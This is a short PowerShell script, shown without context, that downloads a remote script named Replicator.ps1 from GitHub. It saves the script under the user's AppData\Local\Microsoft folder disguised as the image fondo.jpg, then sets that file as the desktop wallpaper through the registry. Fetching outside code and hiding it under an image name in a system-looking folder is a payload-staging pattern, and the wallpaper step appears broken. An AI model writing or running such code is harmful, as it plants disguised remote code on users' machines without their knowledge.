$RegKey='HKCU:\Control Panel\Desktop\'
(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/josprou/Replicator/main/Replicator.ps1') > $Env:SystemDrive\Users\$Env:USERNAME\AppData\Local\Microsoft\fondo.jpg
Set-ItemProperty -Path $RegKey -Name 'Wallpaper' -Value "$Env:SystemDrive\Users\$Env:USERNAME\AppData\Local\Microsoft\fondo.jpg"
